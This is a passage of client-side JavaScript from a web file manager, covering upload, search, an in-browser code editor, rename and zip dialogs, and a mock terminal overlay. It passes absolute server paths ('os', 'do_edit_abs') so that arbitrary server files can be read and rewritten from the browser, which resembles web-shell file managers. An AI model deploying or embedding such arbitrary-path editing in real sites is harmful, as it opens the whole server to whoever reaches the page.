                            if (hasError) {
                                showErrorPopup('Failed' + (errMsg ? ': ' + errMsg : ''));
                                submitBtn.disabled = false;
                            } else {
                                // Success: only change the submit button icon/state, no banner
                                if (submitBtn) {
                                    submitBtn.innerHTML = '<span class="material-symbols-rounded">task_alt</span>';
                                    submitBtn.title = 'Created';
                                    submitBtn.setAttribute('aria-label', 'Created');
                                }
                                // Brief delay to show done state before refresh
                                setTimeout(function(){ window.location.href = form.action; }, 1200);
                            }
                        })
                        .catch(function(){ submitBtn.disabled = false; });
                } catch(err){ submitBtn.disabled = false; }
            });
            return win;
        }

        function openUploadFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                spawnUploadWindow({ rel: rel || '', os: os || '' });
            } catch(e){}
        }
        function openNewFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                spawnAddWindow({ rel: rel || '', os: os || '' });
            } catch(e){}
        }

        document.addEventListener('click', function(ev){
            var a = ev.target && ev.target.closest && ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            // Upload triggers
            if ((href.indexOf('upload=1') !== -1) || a.classList.contains('term-upload')){
                ev.preventDefault();
                openUploadFromHref(href || window.location.href);
                return;
            }
            // New/Add triggers
            if (href.indexOf('new=1') !== -1){
                ev.preventDefault();
                openNewFromHref(href || window.location.href);
                return;
            }
        }, true);
        // Search files/folders: highlight matches and auto-open exact/unique matches
        (function wireSearch(){
            var input = document.getElementById('file-search-input');
            var btn = document.getElementById('file-search-btn');
            var debounceId = null;
            function alignSearchUI(){
                try {
                    var bar = document.querySelector('.command-bar');
                    var pill = bar && bar.querySelector('.command-pill');
                    var sb = bar && bar.querySelector('.search-bar');
                    var inputPill = sb && sb.querySelector('.input-pill');
                    var searchBtn = sb && sb.querySelector('#file-search-btn');
                    if (!pill || !inputPill || !searchBtn) return;
                    // CSS handles sizing; keep layout consistent without runtime mutations
                    // Ensure display flex for safety in older browsers
                    inputPill.style.display = 'flex';
                    inputPill.style.alignItems = 'center';
                    searchBtn.style.display = 'flex';
                    searchBtn.style.alignItems = 'center';
                } catch(e){}
            }
            function clearHighlights(){
                try {
                    var sels = document.querySelectorAll('.name-cell .name-ellipsis.searching, .name-cell .folder-link.searching, .name-cell .name-ellipsis.search-selected, .name-cell .folder-link.search-selected');
                    Array.prototype.forEach.call(sels, function(el){
                        el.classList.remove('searching');
                        el.classList.remove('search-selected');
                        el.style.background = '';
                        el.style.boxShadow = '';
                        el.style.borderRadius = '';
                        el.style.color = '';
                    });
                } catch(e){}
            }
            function getAnchor(el){
                if (!el) return null;
                try {
                    return el.tagName === 'A' ? el : el.closest('a[href]');
                } catch(e){ return null; }
            }
            function performSearch(autonav){
                clearHighlights();
                var q = (input && (input.value || '').trim().toLowerCase()) || '';
                if (!q) return;
                var rows = document.querySelectorAll('table tbody tr');
                var matches = [];
                var exactMatches = [];
                Array.prototype.forEach.call(rows, function(row){
                    var nameCell = row.querySelector('.name-cell');
                    if (!nameCell) return;
                    var el = nameCell.querySelector('.name-ellipsis') || nameCell.querySelector('.folder-link');
                    var text = (el && (el.textContent || '').trim().toLowerCase()) || '';
                    if (text && text.indexOf(q) !== -1){
                        try {
                            el.classList.add('searching');
                            el.classList.add('search-selected');
                        } catch(e){}
                        matches.push(el);
                        if (text === q) exactMatches.push(el);
                    }
                });
                if (matches.length){
                    try { matches[0].scrollIntoView({ behavior: 'smooth', block: 'center' }); } catch(e){}
                }
                if (autonav){
                    var targetEl = exactMatches[0] || (matches.length === 1 ? matches[0] : null);
                    var a = getAnchor(targetEl);
                    if (a && a.href){
                        window.location.href = a.href;
                    }
                }
            }
            if (btn) btn.addEventListener('click', function(){ performSearch(true); });
            if (input){
                input.addEventListener('input', function(){
                    if (debounceId) { try { clearTimeout(debounceId); } catch(e){} }
                    debounceId = setTimeout(function(){ performSearch(true); }, 250);
                });
                input.addEventListener('keydown', function(e){
                    if (e.key === 'Enter') performSearch(true);
                    else if (e.key === 'Escape') { input.value=''; clearHighlights(); }
                });
            }
            // initial alignment and on resize
            alignSearchUI();
            window.addEventListener('resize', function(){
                if (debounceId) { try { clearTimeout(debounceId); } catch(e){} }
                debounceId = setTimeout(alignSearchUI, 150);
            });
        })();
        // Editor popup: open on Edit button clicks, load content, save via POST
        var editorTemplate = document.getElementById('editor-template');
        var editorLayer = document.getElementById('editor-layer');
        var ACE_BASE = 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.0/';
        var aceLoading = null;
        function ensureAce(){
            if (window.ace) return Promise.resolve();
            if (aceLoading) return aceLoading;
            aceLoading = new Promise(function(resolve, reject){
                try {
                    var s = document.createElement('script');
                    s.src = ACE_BASE + 'ace.js';
                    s.async = true;
                    s.onload = function(){ try { ace.config.set('basePath', ACE_BASE); } catch(_){}; resolve(); };
                    s.onerror = function(){ reject(new Error('ace load failed')); };
                    document.head.appendChild(s);
                } catch(e){ reject(e); }
            });
            return aceLoading;
        }
        function detectAceModeByExt(name){
            try {
                var ext = (name.split('.').pop()||'').toLowerCase();
                var map = {
                    'php':'php','js':'javascript','json':'json','css':'css','html':'html','htm':'html','md':'markdown','txt':'text',
                    'ini':'ini','sh':'sh','bash':'sh','py':'python','rb':'ruby','java':'java','c':'c_cpp','cpp':'c_cpp','h':'c_cpp',
                    'cs':'csharp','yaml':'yaml','yml':'yaml','sql':'sql','xml':'xml'
                };
                return map[ext] || 'text';
            } catch(_){ return 'text'; }
        }
        function baseName(p){ try { var parts = (p||'').split(/[\\\/]/); return parts.pop() || p; } catch(e){ return p || ''; } }
        function centerWindow(win){ try {
            var ww = win.offsetWidth || 720; var wh = win.offsetHeight || 520;
            var left = Math.max(6, Math.min(window.innerWidth - ww - 6, Math.round((window.innerWidth - ww) / 2)));
            var top = Math.max(6, Math.min(window.innerHeight - wh - 6, Math.round((window.innerHeight - wh) / 2)));
            win.style.left = left + 'px'; win.style.top = top + 'px';
        } catch(e){} }
        function spawnEditorWindow(opts){
            if (!editorTemplate || !editorLayer) return null;
            var win = editorTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            editorLayer.appendChild(win);
            centerWindow(win);
            var titleEl = win.querySelector('.editor-title');
            var closeBtn = win.querySelector('.editor-close');
            var textarea = win.querySelector('.editor-textarea');
            var aceBox = win.querySelector('.editor-ace');
            var saveBtn = win.querySelector('.editor-save');
            var overlay = win.querySelector('.editor-overlay');
            var overlaySub = win.querySelector('.editor-overlay-sub');
            var undoBtn = win.querySelector('.editor-undo');
            var redoBtn = win.querySelector('.editor-redo');
            var searchInput = win.querySelector('.editor-search-input');
            var searchBtn = win.querySelector('.editor-search-btn');
            if (titleEl && opts && opts.title) titleEl.textContent = opts.title;
            // Load content
            if (textarea){ textarea.value = ''; textarea.disabled = true; }
            try {
                fetch(opts.apiUrl, { method: 'GET', cache: 'no-store' })
                    .then(function(res){ return res.text(); })
                    .then(function(text){
                        if (!aceBox) { if (textarea){ textarea.disabled = false; textarea.value = text; textarea.focus(); textarea.setSelectionRange(0,0); undoStack = [{ value: textarea.value, selStart: 0, selEnd: 0 }]; redoStack = []; updateUndoRedoButtons(); } return; }
                        ensureAce().then(function(){
                            try {
                                aceBox.style.display = 'block';
                                if (textarea) { textarea.style.display = 'none'; }
                                var editor = ace.edit(aceBox);
                                editor.setTheme('ace/theme/monokai');
                                var mode = detectAceModeByExt(opts.title || '');
                                editor.session.setMode('ace/mode/' + mode);
                                editor.session.setUseWrapMode(true);
                                editor.setOptions({ fontSize: '13px', showPrintMargin: false, cursorStyle: 'smooth' });
                                editor.setValue(text || '', -1);
                                win._ace = editor;
                                try { editor.focus(); } catch(_){}
                                if (undoBtn) undoBtn.disabled = false; if (redoBtn) redoBtn.disabled = false;
                                editor.commands.addCommand({ name: 'save', bindKey: {win:'Ctrl-S', mac:'Command-S'}, exec: function(){ doSave(); } });
                            } catch(e){
                                if (textarea){ textarea.disabled = false; textarea.style.display = ''; textarea.value = text; textarea.focus(); textarea.setSelectionRange(0,0); undoStack = [{ value: textarea.value, selStart: 0, selEnd: 0 }]; redoStack = []; updateUndoRedoButtons(); }
                            }
                        }).catch(function(){ if (textarea){ textarea.disabled = false; textarea.value = text; textarea.focus(); textarea.setSelectionRange(0,0); undoStack = [{ value: textarea.value, selStart: 0, selEnd: 0 }]; redoStack = []; updateUndoRedoButtons(); } });
                    })
                    .catch(function(){ if (textarea){ textarea.disabled = false; textarea.value = ''; undoStack = [{ value: '', selStart: 0, selEnd: 0 }]; redoStack = []; updateUndoRedoButtons(); } });
            } catch(e){ if (textarea){ textarea.disabled = false; textarea.value = ''; undoStack = [{ value: '', selStart: 0, selEnd: 0 }]; redoStack = []; updateUndoRedoButtons(); } }
            // Undo/Redo with twin stacks
            var undoStack = [];
            var redoStack = [];
            function applyState(s){ if (!textarea || !s) return; textarea.value = s.value; try { textarea.focus(); textarea.setSelectionRange(s.selStart, s.selEnd); } catch(e){} }
            function currentState(){ if (!textarea) return null; return { value: textarea.value, selStart: textarea.selectionStart || 0, selEnd: textarea.selectionEnd || 0 }; }
            function pushSnapshot(){
                var cur = currentState(); if (!cur) return;
                var last = undoStack[undoStack.length - 1];
                if (last && last.value === cur.value && last.selStart === cur.selStart && last.selEnd === cur.selEnd) return; // avoid duplicates
                undoStack.push(cur);
                redoStack = []; // new edits clear redo history
                updateUndoRedoButtons();
            }
            function doUndo(){
                if (undoStack.length <= 1) return; // keep at least initial state
                var cur = undoStack.pop();
                redoStack.push(cur);
                var prev = undoStack[undoStack.length - 1];
                applyState(prev);
                updateUndoRedoButtons();
            }
            function doRedo(){
                if (redoStack.length === 0) return;
                var next = redoStack.pop();
                // push current before applying redo
                var cur = currentState(); if (cur) undoStack.push(cur);
                applyState(next);
                updateUndoRedoButtons();
            }
            function updateUndoRedoButtons(){
                if (undoBtn) undoBtn.disabled = !(undoStack.length > 1);
                if (redoBtn) redoBtn.disabled = !(redoStack.length > 0);
            }
            // Snapshot on input and blur (textarea fallback)
            textarea && textarea.addEventListener('input', function(){ pushSnapshot(); });
            textarea && textarea.addEventListener('blur', function(){ pushSnapshot(); });
            // Undo button
            undoBtn && undoBtn.addEventListener('click', function(){ if (win._ace) { try { win._ace.undo(); } catch(_){} } else { doUndo(); } });
            // Keyboard: Undo/Redo shortcuts
            textarea && textarea.addEventListener('keydown', function(e){
                var key = (e.key || '').toLowerCase();
                var accel = e.ctrlKey || e.metaKey;
                if (!accel) return;
                // Undo: Ctrl/Cmd+Z
                if (!e.shiftKey && key === 'z') { e.preventDefault(); doUndo(); return; }
                // Redo: Ctrl+Y or Cmd/Ctrl+Shift+Z
                if ((!e.shiftKey && key === 'y') || (e.shiftKey && key === 'z')) { e.preventDefault(); doRedo(); return; }
            });
            // Redo button
            redoBtn && redoBtn.addEventListener('click', function(){ if (win._ace) { try { win._ace.redo(); } catch(_){} } else { doRedo(); } });
            // Editor-integrated Cmd removed per request
            // Save handler: async POST to stay in the popup without page reload
            function doSave(){
                var content = win._ace ? (function(){ try { return win._ace.getValue(); } catch(_){ return ''; } })() : (textarea ? textarea.value : '');
                var url = opts.saveAction || (window.location.pathname + window.location.search);
                var fields = opts.saveFields || {};
                var fd = new FormData();
                Object.keys(fields).forEach(function(k){ fd.append(k, fields[k]); });
                fd.append('content', content);
                if (overlay){ overlay.classList.remove('ok','error'); overlay.classList.add('show'); }
                if (overlaySub) overlaySub.textContent = 'Saving…';
                if (saveBtn) saveBtn.disabled = true;
                try {
                    fetch(url, { method: 'POST', body: fd, cache: 'no-store' })
                        .then(function(res){ if (!res.ok) throw new Error('HTTP ' + res.status); return res.text(); })
                        .then(function(){
                            if (overlay){ overlay.classList.remove('error'); overlay.classList.add('ok'); }
                            if (overlaySub) overlaySub.innerHTML = '<span class="saved-word">Saved</span><br>Done';
                            setTimeout(function(){ if (overlay){ overlay.classList.remove('show','ok'); } }, 1000);
                        })
                        .catch(function(){
                            if (overlay){ overlay.classList.remove('ok'); overlay.classList.add('error','show'); }
                            if (overlaySub) overlaySub.textContent = 'Save failed · Try again';
                            setTimeout(function(){ if (overlay){ overlay.classList.remove('show','error'); } }, 2000);
                        })
                        .finally(function(){ if (saveBtn) saveBtn.disabled = false; });
                } catch(e) {
                    if (saveBtn) saveBtn.disabled = false;
                    if (overlay){ overlay.classList.remove('ok'); overlay.classList.add('error','show'); }
                    if (overlaySub) overlaySub.textContent = 'Try again';
                    setTimeout(function(){ if (overlay){ overlay.classList.remove('show','error'); } }, 2000);
                }
            }
            saveBtn && saveBtn.addEventListener('click', function(){ doSave(); });
            // Ctrl/Cmd+S saves (textarea fallback)
            textarea && textarea.addEventListener('keydown', function(e){ if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's'){ e.preventDefault(); doSave(); } });
            // In-file search (case-insensitive), scoped to this editor window
            (function(){
                var lastPos = 0;
                function findNextTextarea(q){
                    if (!q || !textarea) return;
                    var text = textarea.value;
                    var tq = q.toLowerCase();
                    var t = text.toLowerCase();
                    var start = Math.max(textarea.selectionEnd || 0, lastPos || 0);
                    var idx = t.indexOf(tq, start);
                    if (idx === -1) { idx = t.indexOf(tq, 0); }
                    if (idx !== -1) { var end = idx + q.length; textarea.focus(); try { textarea.setSelectionRange(idx, end); } catch(e){} lastPos = end; }
                }
                function findNextAce(q){
                    if (!q || !win._ace) return;
                    try {
                        win._ace.find(q, { backwards:false, wrap:true, caseSensitive:false, wholeWord:false, regExp:false });
                        win._ace.scrollToLine(win._ace.getSelectionRange().end.row, true, true, function(){});
                    } catch(_){ }
                }
                function findNext(q){ if (win._ace) findNextAce(q); else findNextTextarea(q); }
                if (searchBtn) { searchBtn.addEventListener('click', function(){ var q = (searchInput && searchInput.value) || ''; findNext(q); }); }
                if (searchInput) { searchInput.addEventListener('keydown', function(e){ if (e.key === 'Enter'){ e.preventDefault(); var q = searchInput.value; findNext(q); } }); searchInput.addEventListener('input', function(){ lastPos = 0; }); }
            })();
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            // Drag by titlebar
            var titlebar = win.querySelector('.editor-titlebar');
            var dragging = false, ox = 0, oy = 0;
            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
            return win;
        }
        function openEditorFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                var isAbs = !!u.searchParams.get('edit_abs');
                var name = baseName(rel || os);
                // Block editing of media (audio/video) files with a terminal-style message
                var ext = (name.split('.').pop() || '').toLowerCase();
                var mediaExts = ['mp3','mp4','wav','flac','m4a','aac','ogg','opus','webm','mkv','mov','avi','wmv','mpg','mpeg','3gp','3gpp'];
                if (mediaExts.indexOf(ext) !== -1) {
                    try {
                        var overlay = document.getElementById('op-terminal-overlay');
                        var closeBtn = document.getElementById('op-term-close-btn');
                        var titleIconEl = overlay && overlay.querySelector('.title .material-symbols-rounded');
                        var originalIconName = titleIconEl ? (titleIconEl.textContent || 'terminal') : 'terminal';
                        var audioExts = ['mp3','wav','flac','m4a','aac','ogg','opus'];
                        var videoExts = ['mp4','webm','mkv','mov','avi','wmv','mpg','mpeg','3gp','3gpp'];
                        var iconName = audioExts.indexOf(ext) !== -1 ? 'audio_file' : 'video_file';
                        if (titleIconEl) titleIconEl.textContent = iconName;
                        var cmd = '--sh edit ' + name;
                        var lines = [
                            'Sorry, we can\'t edit this file type.',
                            'You need a dedicated software for this.',
                            'Thank you.'
                        ];
                        if (typeof window.animateList === 'function') {
                            // Keep the terminal overlay open until the user closes it manually
                            window.animateList(cmd, lines, function(){ /* keep open */ });
                            if (closeBtn) { closeBtn.addEventListener('click', function(){ overlay && overlay.classList.remove('show'); if (titleIconEl) titleIconEl.textContent = originalIconName; }); }
                            // Allow closing with Escape key as well
                            document.addEventListener('keydown', function(e){ if (e.key === 'Escape') { overlay && overlay.classList.remove('show'); if (titleIconEl) titleIconEl.textContent = originalIconName; } }, { once: true });
                        }
                    } catch(e){}
                    return;
                }
                var apiUrl = window.location.pathname + '?api=raw_content' + (rel ? ('&d=' + encodeURIComponent(rel)) : ('&os=' + encodeURIComponent(os)));
                // After save, go to directory listing (no inline edit form)
                var action;
                if (rel) {
                    var idx = rel.lastIndexOf('/');
                    var dirRel = idx > -1 ? rel.slice(0, idx) : '';
                    action = window.location.pathname + (dirRel ? ('?d=' + encodeURIComponent(dirRel)) : '');
                } else {
                    var parts = os.split(/[\\\/]/);
                    parts.pop();
                    var dirAbs = parts.join('/');
                    action = window.location.pathname + '?os=' + encodeURIComponent(dirAbs);
                }
                var fields = rel ? { 'do_edit':'1', 'rel': rel } : { 'do_edit_abs':'1', 'os': os };
                spawnEditorWindow({ title: 'Edit: ' + name, apiUrl: apiUrl, saveAction: action, saveFields: fields });
            } catch(e){}
        }
        // Intercept Edit buttons
        document.addEventListener('click', function(ev){
            var a = ev.target && ev.target.closest && ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            if (a.classList.contains('btn-edit') && (href.indexOf('edit=1') !== -1 || href.indexOf('edit_abs=1') !== -1)){
                ev.preventDefault();
                openEditorFromHref(href);
            }
        }, true);
        // Rename popup
        function spawnRenameWindow(opts){
            var tpl = document.getElementById('rename-template');
            var layer = document.getElementById('rename-layer');
            if (!tpl || !layer) return null;
            var win = tpl.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            var titleEl = win.querySelector('.rename-title');
            var input = win.querySelector('.rename-input');
            var saveBtn = win.querySelector('.rename-save');
            var closeBtn = win.querySelector('.rename-close');
            if (titleEl) titleEl.textContent = opts && opts.title ? opts.title : 'Rename';
            if (input && opts && opts.prefill) input.value = opts.prefill;
            function doRename(){
                var newName = (input && input.value) || '';
                newName = newName.trim();
                if (!newName){ try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('New name cannot be empty', true); } catch(e){} return; }
                var action = opts && opts.action ? opts.action : window.location.pathname;
                var fields = opts && opts.fields || {};
                try {
                    var fd = new FormData();
                    Object.keys(fields).forEach(function(k){ fd.append(k, fields[k]); });
                    fd.append('newname', newName);
                    if (saveBtn) saveBtn.disabled = true;
                    var okStatus = false; var didRedirect = false;
                    fetch(action, { method: 'POST', body: fd, redirect: 'follow' })
                        .then(function(res){
                            didRedirect = !!res.redirected || (res.status >= 300 && res.status < 400);
                            okStatus = !!res.ok || didRedirect;
                            return didRedirect ? Promise.resolve('') : res.text();
                        })
                        .then(function(html){
                            var hasError = false, errMsg = '';
                            try {
                                if (!okStatus) {
                                    hasError = true;
                                } else if (!didRedirect && html && html.indexOf('class="error"') !== -1) {
                                    hasError = true;
                                    var parser = new DOMParser();
                                    var doc = parser.parseFromString(html || '', 'text/html');
                                    var errEl = doc && doc.querySelector('.error');
                                    errMsg = (errEl && errEl.textContent) ? errEl.textContent.trim() : '';
                                }
                            } catch(e){}
                            var bodyEl = win.querySelector('.rename-body');
                            var prev = (bodyEl || win).querySelector('.op-status');
                            if (prev) prev.remove();
                            if (hasError) {
                                var banner = document.createElement('div');
                                banner.className = 'op-status err';
                                banner.innerHTML = '<span class="material-symbols-rounded">error</span> Failed' + (errMsg ? ': ' + errMsg : '');
                                (bodyEl || win).insertBefore(banner, (bodyEl || win).firstChild);
                                if (saveBtn) saveBtn.disabled = false;
                                setTimeout(function(){ try { if (banner && banner.parentNode) { banner.remove(); } } catch(e){} }, 2000);
                            } else {
                                if (saveBtn) {
                                    saveBtn.innerHTML = '<span class="material-symbols-rounded">task_alt</span>';
                                    saveBtn.title = 'Renamed';
                                    saveBtn.setAttribute('aria-label', 'Renamed');
                                }
                                setTimeout(function(){ window.location.href = action; }, 1200);
                            }
                        })
                        .catch(function(){ if (saveBtn) saveBtn.disabled = false; });
                } catch(err){ if (saveBtn) saveBtn.disabled = false; }
            }
            saveBtn && saveBtn.addEventListener('click', function(){ doRename(); });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            // Drag by titlebar
            var titlebar = win.querySelector('.rename-titlebar');
            var dragging = false, ox = 0, oy = 0;
            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
            return win;
        }
        function openRenameFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                var isAbs = !!u.searchParams.get('rename_abs');
                var name = baseName(rel || os);
                // After rename, go to directory listing
                var action;
                if (rel) {
                    var idx = rel.lastIndexOf('/');
                    var dirRel = idx > -1 ? rel.slice(0, idx) : '';
                    action = window.location.pathname + (dirRel ? ('?d=' + encodeURIComponent(dirRel)) : '');
                } else {
                    var parts = os.split(/[\\\/]/);
                    parts.pop();
                    var dirAbs = parts.join('/');
                    action = window.location.pathname + '?os=' + encodeURIComponent(dirAbs);
                }
                var fields = rel ? { 'do_rename':'1', 'rel': rel } : { 'do_rename_abs':'1', 'os': os };
                spawnRenameWindow({ title: 'Rename: ' + name, action: action, fields: fields, prefill: name });
            } catch(e){}
        }
        // Intercept Rename buttons
        document.addEventListener('click', function(ev){
            var a = ev.target && ev.target.closest && ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            if (a.classList.contains('btn-rename') && (href.indexOf('rename=1') !== -1 || href.indexOf('rename_abs=1') !== -1)){
                ev.preventDefault();
                openRenameFromHref(href);
            }
        }, true);
        // Zip/Unzip popups
        function fmtZipName(){
            var d = new Date();
            function pad(n){ return (n<10?'0':'') + n; }
            var name = d.getFullYear().toString()
                + pad(d.getMonth()+1)
                + pad(d.getDate())
                + '-' + pad(d.getHours())
                + pad(d.getMinutes())
                + pad(d.getSeconds())
                + '-zip.zip';
            return name;
        }
        function spawnZipWindow(opts){
            var tpl = document.getElementById('zip-template');
            var layer = document.getElementById('zip-layer');
            if (!tpl || !layer) return null;
            var win = tpl.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            var titleEl = win.querySelector('.rename-title');
            var input = win.querySelector('.zip-input');
            var saveBtn = win.querySelector('.zip-save');
            var closeBtn = win.querySelector('.rename-close');
            if (titleEl) titleEl.textContent = opts && opts.title ? opts.title : 'Zip';
            if (input) input.value = (opts && opts.prefill) || fmtZipName();
            function doZip(){
                var zipname = (input && input.value) || '';
                zipname = zipname.trim();
                if (!zipname){ try { if (typeof spawnCmdNotify === 'function') spawnCmdNotify('Archive name cannot be empty', true); } catch(e){} return; }
                // ensure .zip
                if (!/\.zip$/i.test(zipname)) zipname += '.zip';
                var action = (opts && opts.action) ? opts.action : window.location.pathname;
                var fields = (opts && opts.fields) || {};
                function submitZip(){
                    try {
                        var fd = new FormData();
                        Object.keys(fields).forEach(function(k){ fd.append(k, fields[k]); });
                        fd.append('zipname', zipname);
                        if (saveBtn) saveBtn.disabled = true;
                        var okStatus = false; var didRedirect = false;
                        fetch(action, { method: 'POST', body: fd, redirect: 'follow' })
                            .then(function(res){
                                didRedirect = !!res.redirected || (res.status >= 300 && res.status < 400);
                                okStatus = !!res.ok || didRedirect;
                                return didRedirect ? Promise.resolve('') : res.text();
                            })
                            .then(function(html){
                                var hasError = false, errMsg = '';
                                try {
                                    if (!okStatus) {
                                        hasError = true;
                                    } else if (!didRedirect && html && html.indexOf('class="error"') !== -1) {
                                        hasError = true;
                                        var parser = new DOMParser();
                                        var doc = parser.parseFromString(html || '', 'text/html');
                                        var errEl = doc && doc.querySelector('.error');
                                        errMsg = (errEl && errEl.textContent) ? errEl.textContent.trim() : '';
                                    }
                                } catch(e){}
                                var bodyEl = win.querySelector('.rename-body');
                                var prev = (bodyEl || win).querySelector('.op-status');
                                if (prev) prev.remove();
                                if (hasError) {
                                    var banner = document.createElement('div');
                                    banner.className = 'op-status err';
                                    banner.innerHTML = '<span class="material-symbols-rounded">error</span> Failed' + (errMsg ? ': ' + errMsg : '');
                                    (bodyEl || win).insertBefore(banner, (bodyEl || win).firstChild);
                                    if (saveBtn) saveBtn.disabled = false;
                                    setTimeout(function(){ try { if (banner && banner.parentNode) { banner.remove(); } } catch(e){} }, 2000);
                                } else {
                                    // Success: change the submit button icon to indicate completion
                                    if (saveBtn) {
                                        saveBtn.innerHTML = '<span class="material-symbols-rounded">task_alt</span>';
                                        saveBtn.title = 'Zip created';
                                        saveBtn.setAttribute('aria-label', 'Zip created');
                                    }
                                    setTimeout(function(){ window.location.href = action; }, 1500);
                                }
                            })
                            .catch(function(){ if (saveBtn) saveBtn.disabled = false; });
                    } catch(err){ if (saveBtn) saveBtn.disabled = false; }
                }
                // Show operation overlay with command-style output and list entries
                try {
                    var cmdTxt = '--sh zip ' + (opts && opts.targetName ? opts.targetName : '');
                    var rel = (fields && fields.rel) || '';
                    var os = (fields && fields.os) || '';
                    var lsUrl = rel ? ('?api=ls&d=' + encodeURIComponent(rel)) : (os ? ('?api=ls&os=' + encodeURIComponent(os)) : null);
                    if (window && typeof window.animateList === 'function' && lsUrl){
                        fetch(lsUrl, { method:'GET', cache:'no-store' })
                            .then(function(r){ return r.text(); })
                            .then(function(t){
                                var lines = (t || '').split('\n').filter(function(x){ return x && x.trim() !== ''; });
                                try { window.animateList(cmdTxt, lines, submitZip); } catch(e){ submitZip(); }
                            })
                            .catch(function(){ try { window.animateList(cmdTxt, [], submitZip); } catch(e){ submitZip(); } });
                    } else {
                        // Fallback to simple overlay typing
                        var overlay = document.getElementById('op-terminal-overlay');
                        var output = document.getElementById('op-term-output');
                        if (overlay && output){
                            overlay.classList.add('show');
                            output.textContent = '$ ';
                            output.textContent += cmdTxt + '\n';
                        }
                        submitZip();
                    }
                } catch(e){ submitZip(); }
            }
            saveBtn && saveBtn.addEventListener('click', function(){ doZip(); });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            // Drag by titlebar
            var titlebar = win.querySelector('.rename-titlebar');
            var dragging = false, ox = 0, oy = 0;
            function onDown(ev){ dragging = true; var p = ev.touches ? ev.touches[0] : ev; var rect = win.getBoundingClientRect(); ox = p.clientX - rect.left; oy = p.clientY - rect.top; document.body.style.userSelect = 'none'; document.addEventListener('mousemove', onMove); document.addEventListener('touchmove', onMove, { passive:false }); document.addEventListener('mouseup', onUp); document.addEventListener('touchend', onUp); }
            function onMove(ev){ if (!dragging) return; if (ev.cancelable) ev.preventDefault(); var p = ev.touches ? ev.touches[0] : ev; var left = p.clientX - ox; var top = p.clientY - oy; var maxLeft = window.innerWidth - win.offsetWidth - 8; var maxTop = window.innerHeight - win.offsetHeight - 8; if (left < 8) left = 8; if (top < 8) top = 8; if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop; win.style.left = left + 'px'; win.style.top = top + 'px'; }
            function onUp(){ if (!dragging) return; dragging = false; document.body.style.userSelect = ''; document.removeEventListener('mousemove', onMove); document.removeEventListener('touchmove', onMove); document.removeEventListener('mouseup', onUp); document.removeEventListener('touchend', onUp); }
            titlebar && titlebar.addEventListener('mousedown', onDown);
            titlebar && titlebar.addEventListener('touchstart', onDown, { passive:true });
            return win;
        }
        function openZipFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('d') || '';
                var os = u.searchParams.get('os') || '';
                var isAbs = !!u.searchParams.get('zip_abs');
                var name = baseName(rel || os);
                // After zip, remain in listing of current dir
                var action;
                if (rel) {
                    var idx = rel.lastIndexOf('/');
                    var dirRel = idx > -1 ? rel.slice(0, idx) : rel; // zip folder itself
                    action = window.location.pathname + (dirRel ? ('?d=' + encodeURIComponent(dirRel)) : '');
